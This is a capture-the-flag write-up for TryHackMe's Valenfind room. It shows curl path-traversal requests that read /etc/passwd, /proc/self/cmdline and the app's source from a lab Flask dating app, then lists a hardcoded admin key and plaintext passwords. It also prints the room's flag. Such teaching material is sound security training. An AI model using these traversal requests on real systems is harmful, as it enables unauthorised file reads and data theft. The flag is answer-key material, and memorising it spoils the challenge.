---
link: https://tryhackme.com/room/lafb2026e10
description:
tags:
image: https://cdn-images.tryhackme.com/room-icons/5ed5961c6276df568891c3ea-1770943483211
solved: true
solve date: 2026-07-15
---

<div style="text-align: center; padding: 80px 40px; page-break-after: always;">

  <img src="/ASSETS/try_hack_me_logo.png" style="width: 1220px; margin-bottom: 60px;" />

  <div><p style="font-size: 40px; font-weight: 600; margin-bottom: 40px;">Valenfind Writeup</p></div>

  <img src="https://cdn-images.tryhackme.com/room-icons/5ed5961c6276df568891c3ea-1770943483211" style="width: 400px; margin-bottom: 60px;" />

  <div style="font-size: 18px; line-height: 2.2;">
    <p style="margin: 0;">Prepared by: nedmoeca</p>
    <p style="margin: 0;">Author(s): munra, DrGonz0</p>
    <p style="margin: 0;">Difficulty: Medium</p>
    <p style="margin: 0;">Date: 15 Jul 2026</p>
  </div>

</div>
<!-- PAGE BREAK -->

## Summary

**Category:** Web

Valenfind is a web-focused challenge built around a fictional dating application called **ValenFind**. The challenge card jokes that the creator "only learned to code this year" and that the app "must be vibe-coded" — a strong hint that the application is likely riddled with beginner security mistakes. Our goal is to find and exploit those mistakes to recover the flag.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Connect to THM VPN & Start Lab Machine 

First, download your personalized `.ovpn` file from Try Hack Me.

Connect to the THM VPN using the `.ovpn` configuration file. This establishes a secure tunnel that allows access to the target machine’s internal network.

Command: `sudo openvpn your_file.ovpn`

Start Lab Machine.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Task 1 Valenfind
### What is the flag?

![[valenfind task1.png]]

==Answer==

`THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}`
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 1. Verifying the Target is Reachable

Before any testing begins, we confirm the target machine is actually online and reachable from our attacking machine. The simplest way to do this is an **ICMP ping test**. Ping sends small network packets called "echo requests" to a host; if the host is up and reachable, it sends "echo replies" back. Think of it as knocking on a door and listening for someone to knock back.

Command: `ping -c 4 TARGET_IP`

**Breakdown:**

- `-c 4` → sends 4 packets only (clean output, fast)

**Result**:

```shell
┌──(kali㉿kali)-[~/nedmoeca/THM/Valenfind]
└─$ ping -c 4 TARGET_IP
PING TARGET_IP (TARGET_IP) 56(84) bytes of data.
64 bytes from TARGET_IP: icmp_seq=1 ttl=62 time=290 ms
64 bytes from TARGET_IP: icmp_seq=2 ttl=62 time=288 ms
64 bytes from TARGET_IP: icmp_seq=3 ttl=62 time=288 ms
64 bytes from TARGET_IP: icmp_seq=4 ttl=62 time=292 ms

--- TARGET_IP ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 288.175/289.584/292.173/1.621 ms
```

A successful response confirms that the machine is active and accessible on the THM network, allowing us to proceed with the enumeration phase.

The next move is to **explore the app like a normal user first**. Before attacking anything, you want a mental map of what the application does — what pages exist, what features take user input, and where the app might trust data it shouldn't.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 2. Enumeration of Web Services

The challenge is filed under the **Web** category and the task card hands us a direct entry point: `http://10.48.131.246:5000`. Because we already know the port, a port scan is optional. Instead, we simply open the address in a browser to confirm a web application is being served there.

> A quick note on the port: **5000** is the default port for **Flask**, a lightweight Python web framework. Seeing an app on this port fits the "creator only learned to code this year… vibe-coded" story perfectly — Flask is a common first framework for new Python developers.

Navigate to `http://10.48.131.246:5000`. Port 5000 is serving a live web app, **ValenFind**, a dating-site theme that matches the challenge story.

**Result**:

![[Pasted image 20260714194059.png]]

The service is live and serving the ValenFind dating application. We now explore it like a normal user.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3. Mapping the Application's Routes



Before attacking anything, walk through the application as a legitimate user and note the pages you can see. In web applications, each URL the server responds to is called a **route** (or **endpoint**). Building a list of these is like sketching a floor plan of a building: once you know where every room is, you can reason about which ones you should not be allowed into but might be able to reach/access anyway.

Register a test account by clicking on "Start Your Journey" or "Sign Up". 

**Result:**

![[ValenFind_register.png]]

![[ValenFind_complete_profile.png]]

![[ValenFind_dashboard.png]]

By clicking through the app — registering an account, filling in the profile form, and reaching the dashboard — we discover the following routes:

| Action taken                     | Route (URL path)      | What the page does                                                |
| -------------------------------- | --------------------- | ----------------------------------------------------------------- |
| "Start Your Journey" / "Sign Up" | `/register`           | Creates a new account                                             |
| "Login"                          | `/login`              | Authenticates an existing user                                    |
| After registering                | `/complete_profile`   | Collects personal details (name, email, phone, home address, bio) |
| "Finish Profile & Start Dating"  | `/dashboard`          | Shows "Potential Matches" — a grid of other users                 |
| "My Profile" (top nav)           | `/my_profile`         | Edit your own account's details                                   |
| "Profile" button on a user card  | `/profile/<username>` | Shows a single user's public profile                              |

Two observations stand out:

1. The `/complete_profile` form collects genuinely **sensitive personal data** — phone number and home address — and the page even winks at us with _"(Your secrets are safe with us… mostly.)"_ Any place an app stores private data per-user is a prime target.
2. Profiles are addressed by **username** in the URL (`/profile/romeo_montague`), not by a hidden ID. This means any user's profile can be reached just by knowing their name.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 4. Inspecting the Profile Page and Theme Switcher

Opening another user's profile (like `/profile/romeo_montague`) reveals a feature we haven't seen yet: a **"Profile Theme"** dropdown next to the avatar, offering "Classic Romance", "Modern Dark", and "Cupid's Choice". Switching between them visibly re-renders the page each time.

Anything that lets a user pick a value which then changes how the server builds a page is worth a close look. To understand the mechanism, read the **raw HTML source** of the profile page. 

```html

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ValenFind - Secure Dating</title>
    <style>
        :root { --primary: #ff4757; --secondary: #ff6b81; --bg: #ffe2e6; --card: #fff; --text: #2f3542; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: var(--bg); color: var(--text); margin: 0; padding: 0; min-height: 100vh; display: flex; flex-direction: column; }
        .nav { background: var(--primary); padding: 1rem 2rem; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .nav a { color: white; text-decoration: none; margin-left: 20px; font-weight: 600; }
        .brand { font-size: 1.5rem; font-weight: bold; color: white; display: flex; align-items: center; gap: 10px; }
        .container { flex: 1; padding: 2rem; max-width: 900px; margin: 0 auto; width: 100%; box-sizing: border-box; }
        .card { background: var(--card); border-radius: 12px; padding: 2rem; box-shadow: 0 4px 6px rgba(0,0,0,0.05); margin-bottom: 1.5rem; }
        .btn { background: var(--primary); color: white; border: none; padding: 10px 20px; border-radius: 25px; cursor: pointer; font-size: 0.95rem; text-decoration: none; display: inline-block; transition: 0.2s; }
        .btn:hover { background: var(--secondary); transform: translateY(-1px); }
        .avatar { width: 60px; height: 60px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 1.5rem; }
        input, textarea { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-family: inherit; }
        .flash { background: #ff7675; color: white; padding: 10px; border-radius: 8px; margin-bottom: 15px; text-align: center; }
    </style>
</head>
<body>
    <div class="nav">
        <div class="brand"><span>💘</span> ValenFind</div>
        <div>
            
                <a href="/dashboard">User Profiles</a>
                <a href="/my_profile">My Profile</a>
                <a href="/logout">Logout</a>
            
        </div>
    </div>
    <div class="container">
        
            
        
        
<div class="card" style="max-width: 600px; margin: 0 auto; text-align: center;">
    
    <div style="width: 150px; height: 150px; margin: 0 auto 20px auto; position: relative; border-radius: 50%; overflow: hidden; border: 4px solid #fff; box-shadow: 0 5px 15px rgba(0,0,0,0.1);">
        <img src="/static/avatars/romeo.jpg" 
             alt="romeo_montague" 
             style="width: 100%; height: 100%; object-fit: cover;"
             onerror="this.style.display='none'; this.nextElementSibling.style.display='flex'">
        
        <div style="display: none; width: 100%; height: 100%; background-color: #425d11; align-items: center; justify-content: center; color: white; font-size: 4rem; position: absolute; top: 0; left: 0;">
            R
        </div>
    </div>

    <div style="margin-bottom: 20px; text-align: right;">
        <label for="theme-selector" style="font-size: 0.8rem; color: #666;">Profile Theme:</label>
        <select id="theme-selector" onchange="loadTheme(this.value)" style="padding: 5px; border-radius: 5px; border: 1px solid #ddd;">
            <option value="theme_classic.html">Classic Romance</option>
            <option value="theme_modern.html">Modern Dark</option>
            <option value="theme_romance.html">Cupid's Choice</option>
        </select>
    </div>

    <div id="bio-container">
        <p style="color:#999;">Loading layout...</p>
    </div>

    <hr style="border: 0; border-top: 1px solid #eee; margin: 20px 0;">

    <form action="/like/1" method="POST">
        <button class="btn" style="width: 100%; font-size: 1.1rem; padding: 15px;">💘 Send Valentine</button>
    </form>
</div>

<script>
    // Initial load
    document.addEventListener("DOMContentLoaded", function() {
        loadTheme('theme_classic.html');
    });

    function loadTheme(layoutName) {
        // Feature: Dynamic Layout Fetching
        fetch(`/api/fetch_layout?layout=${layoutName}`)
            .then(r => r.text())
            .then(html => {
                const bioText = "Looking for my Juliet. Where art thou?";
                const username = "romeo_montague";
                
                // Client-side rendering of the fetched template
                let rendered = html.replace('__USERNAME__', username)
                                   .replace('__BIO__', bioText);
                
                document.getElementById('bio-container').innerHTML = rendered;
            })
            .catch(e => {
                console.error(e);
                document.getElementById('bio-container').innerText = "Error loading theme.";
            });
    }
</script>

    </div>
</body>
</html>
```

**The important portion:**

```html
<select id="theme-selector" onchange="loadTheme(this.value)" ...>
    <option value="theme_classic.html">Classic Romance</option>
    <option value="theme_modern.html">Modern Dark</option>
    <option value="theme_romance.html">Cupid's Choice</option>
</select>
...
<script>
    function loadTheme(layoutName) {
        // Feature: Dynamic Layout Fetching
        fetch(`/api/fetch_layout?layout=${layoutName}`)
            .then(r => r.text())
            .then(html => {
                const bioText = "Looking for my Juliet. Where art thou?";
                const username = "romeo_montague";
                let rendered = html.replace('__USERNAME__', username)
                                   .replace('__BIO__', bioText);
                document.getElementById('bio-container').innerHTML = rendered;
            });
    }
</script>
```

This is the key discovery. The theme dropdown does **not** just switch styling — the JavaScript fetches an actual **file** from the server by name:

- `/api/fetch_layout` is a route we hadn't seen; its job is to read a layout file and return its contents.
- `?layout=theme_modern.html` is a **query parameter** (the `?name=value` part of a URL) named `layout` whose value is a **filename**.

In other words, the server takes a filename supplied by the user and returns that file's contents. That is a textbook setup for a file-read vulnerability. Note also that although the browser only offers three theme names, we are not limited to them — we can call `/api/fetch_layout` directly with any value we choose.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 5. Establishing a Baseline for the File Endpoint

Before trying to abuse the endpoint, we capture what it returns when used **normally**. This is good discipline: you cannot recognise abnormal (exploited) output if you have never seen the normal output. We switch from the browser to the command line and use **curl**, a tool that makes raw web requests and prints the response as plain text (no rendering) — ideal for seeing exactly what the server sends.

**Command:** 

	`curl "http://10.48.175.125:5000/api/fetch_layout?layout=theme_modern.html"` or 
	`curl "http://10.49.188.115:5000/api/fetch_layout?layout=theme_romance.html"` or 
	`curl "http://10.49.188.115:5000/api/fetch_layout?layout=theme_classic.html"`

**Breakdown:**

- `curl`
    - Description: A command-line tool that sends an HTTP request and prints the server's raw response.
    - Purpose: To see the exact text the endpoint returns, without a browser interpreting it.
- `"..."` (the quotes around the URL)
    - Description: Double quotes wrap the whole URL.
    - Purpose: Stops the shell from treating special characters like `?` and `=` as commands; they are passed literally as part of the URL.
- `?layout=theme_modern.html`
    - Description: The `layout` query parameter set to a known-good theme filename.
    - Purpose: To capture what a legitimate, valid response looks like as our baseline.

**Result:**

```shell
┌──(kali㉿kali)-[~]
└─$ curl "http://10.49.188.115:5000/api/fetch_layout?layout=theme_romance.html"                                   

        <div class="bio-box romance" style="
            background: linear-gradient(135deg, #ff9a9e 0%, #fecfef 99%, #fecfef 100%); 
            color: #c0392b; 
            padding: 30px; 
            border-radius: 50px 0 50px 0; 
            border: 2px dashed #ff6b81;
            text-align: center;">
            <div style="font-size: 2rem; margin-bottom: 10px;">💖 💘 💖</div>
            <h3 style="font-family: 'Brush Script MT', cursive; font-size: 2.5rem; margin: 10px 0;">__USERNAME__</h3>
            <p style="font-weight: bold; font-size: 1.1rem;">✨ __BIO__ ✨</p>
            <div style="font-size: 1.5rem; margin-top: 15px;">💌</div>
        </div>


┌──(kali㉿kali)-[~/nedmoeca/THM/Valenfind]
└─$ curl "http://10.49.188.115:5000/api/fetch_layout?layout=theme_modern.html" 

        <div class="bio-box modern" style="
            background: #2f3542; 
            color: #dfe4ea; 
            padding: 25px; 
            border-radius: 15px; 
            border-left: 5px solid #2ed573;
            font-family: 'Courier New', monospace;">
            <h3 style="color: #2ed573; text-transform: uppercase; letter-spacing: 2px; margin-top: 0;">__USERNAME__</h3>
            <p style="line-height: 1.5;">> __BIO__<span style="animation: blink 1s infinite;">_</span></p>
            <style>@keyframes blink { 50% { opacity: 0; } }</style>
        </div>


┌──(kali㉿kali)-[~/nedmoeca/THM/Valenfind]
└─$ curl "http://10.49.188.115:5000/api/fetch_layout?layout=theme_classic.html"

        <div class="bio-box" style="
            background: #ffffff; 
            border: 1px solid #e1e1e1; 
            padding: 20px; 
            border-radius: 12px; 
            box-shadow: 0 4px 6px rgba(0,0,0,0.05); 
            text-align: left;">
            <h3 style="color: #2c3e50; border-bottom: 2px solid #ff4757; padding-bottom: 10px; display: inline-block;">__USERNAME__</h3>
            <p style="color: #7f8c8d; font-style: italic; line-height: 1.6;">"__BIO__"</p>
        </div>
                  
```

The endpoint reads a file from a "themes" folder and hands back its raw contents (with `__USERNAME__` and `__BIO__` placeholders that the JavaScript fills in afterward). This confirms the endpoint's entire job is "given a filename, return that file." Perfect conditions to test for path traversal.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 6. Path Traversal / Local File Inclusion

We can now test whether the `layout` parameter lets us break out of the themes directory and read files elsewhere on the server. This class of flaw is called **Path Traversal** (also **LFI — Local File Inclusion**): abusing a file-reading feature to "traverse" to files it was never meant to serve.

The tool for climbing directories is the sequence **`../`**. Picture the server's folders as nested boxes: `../` means "step up into the box that contains this one." Chain several together (`../../../../`) and you climb from the app's theme folder all the way up to the **root** of the filesystem (`/`), from which you can point back down to any file.

The universal proof-of-concept target is **`/etc/passwd`** — a text file present on every Linux system that lists user accounts and is readable by everyone. Retrieving it cleanly demonstrates arbitrary file read without touching anything genuinely sensitive.

**Command:** `curl "http://10.48.175.125:5000/api/fetch_layout?layout=../../../../etc/passwd"`

**Breakdown:**

- `../../../../`
    - Description: Four "step up one directory" sequences.
    - Purpose: To climb from the themes folder up to the filesystem root (`/`). We use several because we don't yet know how deep the themes folder sits; overshooting is harmless — once at the top, extra `../` are simply ignored.
- `etc/passwd`
    - Description: From root, the path down into the `/etc` folder to the `passwd` file.
    - Purpose: A world-readable account list that proves arbitrary file read if returned.

**Result:**

```shell
┌──(kali㉿kali)-[~/nedmoeca/THM/Valenfind]
└─$ curl "http://10.49.188.115:5000/api/fetch_layout?layout=../../../../etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
fwupd-refresh:x:113:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
dhcpcd:x:114:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
polkitd:x:997:997:User for polkitd:/:/usr/sbin/nologin
```

Arbitrary file read is confirmed. Reading `/etc/passwd` also gives useful intel. Each line describes one account, with fields separated by colons:

`name : password-placeholder : UID : GID : description : home-directory : login-shell`

The `x` in the second field means the real password hash lives in the protected `/etc/shadow` file, not here. The accounts with a real login shell (`/bin/bash`) rather than `/usr/sbin/nologin` are the genuine interactive users:

| Account  | UID  | Home directory | Shell       |
| -------- | ---- | -------------- | ----------- |
| `root`   | 0    | `/root`        | `/bin/bash` |
| `ubuntu` | 1000 | `/home/ubuntu` | `/bin/bash` |
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 7. Locating the Application Source

Reading `/etc/passwd` proves the vulnerability, but the flag won't be there. The smartest next move is to read the **web application's own source code**: the source reveals where everything lives (file paths, secret keys, hidden routes) and turns blind guessing into targeted reads.

First we must learn **where** the app's files sit on disk. Linux exposes a virtual folder called `/proc` that describes running programs. One special file, `/proc/self/cmdline`, contains the exact command used to launch **the process that is serving our request** — which reveals the script's name and full path.

Command: `curl "http://10.48.175.125:5000/api/fetch_layout?layout=../../../../proc/self/cmdline" --output -`

Breakdown:

- `/proc/self/cmdline`
    - Description: A virtual file holding the launch command of the current server process.
    - Purpose: To reveal the application's directory and filename (e.g. `python3 /path/app.py`).
- `--output -`
    - Description: Tells curl to write the response to standard output (the `-` means "the screen").
    - Purpose: This file separates its fields with invisible **null bytes** (zero-value characters). Forcing raw output ensures curl prints the content even though the fields will appear mashed together, which is expected.

Result:

```shell
┌──(kali㉿kali)-[~/nedmoeca/THM/Valenfind]
└─$ curl "http://10.49.188.115:5000/api/fetch_layout?layout=../../../../../../proc/self/cmdline" --output -       
/usr/bin/python3/opt/Valenfind/app.py   
```

The two null-separated pieces are `/usr/bin/python3` (the Python interpreter) and `/opt/Valenfind/app.py` (the script it runs). `/opt` is the standard Linux location for optionally-installed, self-contained applications — a sensible home for a custom app. The main source file is therefore: `/opt/Valenfind/app.py`
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 8. Dumping the Application Source Code

With the path known, we point the same path-traversal read at the source file. The source is the map to everything — every route, where data is stored, and any hardcoded secrets.

**Command:** `curl "http://10.48.175.125:5000/api/fetch_layout?layout=../../../../opt/Valenfind/app.py"`

**Result:**

```shell
┌──(kali㉿kali)-[~/nedmoeca/THM/Valenfind]
└─$ curl "http://10.49.188.115:5000/api/fetch_layout?layout=../../../../../../opt/Valenfind/app.py"        
import os
import sqlite3
import hashlib
from flask import Flask, render_template, request, redirect, url_for, session, send_file, g, flash, jsonify
from seeder import INITIAL_USERS

app = Flask(__name__)
app.secret_key = os.urandom(24)

ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"
DATABASE = 'cupid.db'

def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
        db.row_factory = sqlite3.Row
    return db

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()

def init_db():
    if not os.path.exists(DATABASE):
        with app.app_context():
            db = get_db()
            cursor = db.cursor()
            
            cursor.execute('''
                CREATE TABLE users (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    username TEXT NOT NULL UNIQUE,
                    password TEXT NOT NULL,
                    real_name TEXT,
                    email TEXT,
                    phone_number TEXT,
                    address TEXT,
                    bio TEXT,
                    likes INTEGER DEFAULT 0,
                    avatar_image TEXT
                )
            ''')
            
            cursor.executemany('INSERT INTO users (username, password, real_name, email, phone_number, address, bio, likes, avatar_image) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)', INITIAL_USERS)
            db.commit()
            print("Database initialized successfully.")

@app.template_filter('avatar_color')
def avatar_color(username):
    hash_object = hashlib.md5(username.encode())
    return '#' + hash_object.hexdigest()[:6]

# --- ROUTES ---

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        db = get_db()
        try:
            cursor = db.cursor()
            cursor.execute('INSERT INTO users (username, password, bio, real_name, email, avatar_image) VALUES (?, ?, ?, ?, ?, ?)', 
                       (username, password, "New to ValenFind!", "", "", "default.jpg"))
            db.commit()
            
            user_id = cursor.lastrowid
            session['user_id'] = user_id
            session['username'] = username
            session['liked'] = []
            
            flash("Account created! Please complete your profile.")
            return redirect(url_for('complete_profile'))
            
        except sqlite3.IntegrityError:
            return render_template('register.html', error="Username already taken.")
    return render_template('register.html')

@app.route('/complete_profile', methods=['GET', 'POST'])
def complete_profile():
    if 'user_id' not in session:
        return redirect(url_for('login'))
        
    if request.method == 'POST':
        real_name = request.form['real_name']
        email = request.form['email']
        phone = request.form['phone']
        address = request.form['address']
        bio = request.form['bio']
        
        db = get_db()
        db.execute('''
            UPDATE users 
            SET real_name = ?, email = ?, phone_number = ?, address = ?, bio = ?
            WHERE id = ?
        ''', (real_name, email, phone, address, bio, session['user_id']))
        db.commit()
        
        flash("Profile setup complete! Time to find your match.")
        return redirect(url_for('dashboard'))
        
    return render_template('complete_profile.html')

@app.route('/my_profile', methods=['GET', 'POST'])
def my_profile():
    if 'user_id' not in session:
        return redirect(url_for('login'))
        
    db = get_db()
    
    if request.method == 'POST':
        real_name = request.form['real_name']
        email = request.form['email']
        phone = request.form['phone']
        address = request.form['address']
        bio = request.form['bio']
        
        db.execute('''
            UPDATE users 
            SET real_name = ?, email = ?, phone_number = ?, address = ?, bio = ?
            WHERE id = ?
        ''', (real_name, email, phone, address, bio, session['user_id']))
        db.commit()
        flash("Profile updated successfully! ✅")
        return redirect(url_for('my_profile'))
    
    user = db.execute('SELECT * FROM users WHERE id = ?', (session['user_id'],)).fetchone()
    return render_template('edit_profile.html', user=user)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        db = get_db()
        user = db.execute('SELECT * FROM users WHERE username = ?', (username,)).fetchone()
        
        if user and user['password'] == password:
            session['user_id'] = user['id']
            session['username'] = user['username']
            session['liked'] = [] 
            return redirect(url_for('dashboard'))
        else:
            return render_template('login.html', error="Invalid credentials.")
    return render_template('login.html')

@app.route('/dashboard')
def dashboard():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    
    db = get_db()
    profiles = db.execute('SELECT id, username, likes, bio, avatar_image FROM users WHERE id != ?', (session['user_id'],)).fetchall()
    return render_template('dashboard.html', profiles=profiles, user=session['username'])

@app.route('/profile/<username>')
def profile(username):
    if 'user_id' not in session:
        return redirect(url_for('login'))
        
    db = get_db()
    profile_user = db.execute('SELECT id, username, bio, likes, avatar_image FROM users WHERE username = ?', (username,)).fetchone()
    
    if not profile_user:
        return "User not found", 404
        
    return render_template('profile.html', profile=profile_user)

@app.route('/api/fetch_layout')
def fetch_layout():
    layout_file = request.args.get('layout', 'theme_classic.html')
    
    if 'cupid.db' in layout_file or layout_file.endswith('.db'):
        return "Security Alert: Database file access is strictly prohibited."
    if 'seeder.py' in layout_file:
        return "Security Alert: Configuration file access is strictly prohibited."
    
    try:
        base_dir = os.path.join(os.getcwd(), 'templates', 'components')
        file_path = os.path.join(base_dir, layout_file)
        
        with open(file_path, 'r') as f:
            return f.read()
    except Exception as e:
        return f"Error loading theme layout: {str(e)}"

@app.route('/like/<int:user_id>', methods=['POST'])
def like_user(user_id):
    if 'user_id' not in session:
        return redirect(url_for('login'))
    
    if 'liked' not in session:
        session['liked'] = []
        
    if user_id in session['liked']:
        flash("You already liked this person! Don't be desperate. 😉")
        return redirect(request.referrer)

    db = get_db()
    db.execute('UPDATE users SET likes = likes + 1 WHERE id = ?', (user_id,))
    db.commit()
    
    session['liked'].append(user_id)
    session.modified = True
    
    flash("You sent a like! ❤️")
    return redirect(request.referrer)

@app.route('/logout')
def logout():
    session.pop('user_id', None)
    session.pop('liked', None)
    return redirect(url_for('index'))

@app.route('/api/admin/export_db')
def export_db():
    auth_header = request.headers.get('X-Valentine-Token')
    
    if auth_header == ADMIN_API_KEY:
        try:
            return send_file(DATABASE, as_attachment=True, download_name='valenfind_leak.db')
        except Exception as e:
            return str(e)
    else:
        return jsonify({"error": "Forbidden", "message": "Missing or Invalid Admin Token"}), 403

if __name__ == '__main__':
    if not os.path.exists('templates/components'):
        os.makedirs('templates/components')
    
    with open('templates/components/theme_classic.html', 'w') as f:
        f.write('''
        <div class="bio-box" style="
            background: #ffffff; 
            border: 1px solid #e1e1e1; 
            padding: 20px; 
            border-radius: 12px; 
            box-shadow: 0 4px 6px rgba(0,0,0,0.05); 
            text-align: left;">
            <h3 style="color: #2c3e50; border-bottom: 2px solid #ff4757; padding-bottom: 10px; display: inline-block;">__USERNAME__</h3>
            <p style="color: #7f8c8d; font-style: italic; line-height: 1.6;">"__BIO__"</p>
        </div>
        ''')
        
    with open('templates/components/theme_modern.html', 'w') as f:
        f.write('''
        <div class="bio-box modern" style="
            background: #2f3542; 
            color: #dfe4ea; 
            padding: 25px; 
            border-radius: 15px; 
            border-left: 5px solid #2ed573;
            font-family: 'Courier New', monospace;">
            <h3 style="color: #2ed573; text-transform: uppercase; letter-spacing: 2px; margin-top: 0;">__USERNAME__</h3>
            <p style="line-height: 1.5;">> __BIO__<span style="animation: blink 1s infinite;">_</span></p>
            <style>@keyframes blink { 50% { opacity: 0; } }</style>
        </div>
        ''')

    with open('templates/components/theme_romance.html', 'w') as f:
        f.write('''
        <div class="bio-box romance" style="
            background: linear-gradient(135deg, #ff9a9e 0%, #fecfef 99%, #fecfef 100%); 
            color: #c0392b; 
            padding: 30px; 
            border-radius: 50px 0 50px 0; 
            border: 2px dashed #ff6b81;
            text-align: center;">
            <div style="font-size: 2rem; margin-bottom: 10px;">💖 💘 💖</div>
            <h3 style="font-family: 'Brush Script MT', cursive; font-size: 2.5rem; margin: 10px 0;">__USERNAME__</h3>
            <p style="font-weight: bold; font-size: 1.1rem;">✨ __BIO__ ✨</p>
            <div style="font-size: 1.5rem; margin-top: 15px;">💌</div>
        </div>
        ''')

    init_db()
    app.run(debug=False, host='0.0.0.0', port=5000)
```

**Key Findings:**

1. **Passwords are stored in plain text.** At registration the raw password is written straight into the database (**line 70**, `cursor.execute('INSERT INTO users (username, password, ...`), and the login route later compares it directly with no hashing:
    
    ```python
    145:        if user and user['password'] == password:
    ```
    
    The `users` table even defines `password` as a plain `TEXT` column (**line 36**). So the database `cupid.db` holds every user's real password in readable form. That database is the prize.
    
2. **The developer tried to protect the database — and left another door open.** The `fetch_layout` endpoint has a **blocklist** at **lines 180–183**: it refuses any `layout` value containing `cupid.db`, ending in `.db`, or naming `seeder.py`.
    
    ```python
    180:    if 'cupid.db' in layout_file or layout_file.endswith('.db'):
    181:        return "Security Alert: Database file access is strictly prohibited."
    182:    if 'seeder.py' in layout_file:
    183:        return "Security Alert: Configuration file access is strictly prohibited."
    ```
    
    So our path-traversal trick **cannot** grab the database file directly. (This is the "…mostly" wink from earlier — one hole patched, others left open.)
    
3. **A hidden admin route exports the whole database.** The route `/api/admin/export_db` (**lines 222–232**) calls `send_file(DATABASE, ...)` — it hands over the entire `cupid.db` — **if** the request carries an HTTP header named `X-Valentine-Token` whose value equals `ADMIN_API_KEY`:
    
    ```python
    224:    auth_header = request.headers.get('X-Valentine-Token')
    225:
    226:    if auth_header == ADMIN_API_KEY:
    227:        try:
    228:            return send_file(DATABASE, as_attachment=True, download_name='valenfind_leak.db')
    ```
    
    An **HTTP header** is a hidden metadata line sent alongside a request; here the app invents a custom one to act as a password.
    
4. **The admin key is hardcoded in the source we just read** (**line 10**):
    
    ```python
    10:  ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"
    ```
    

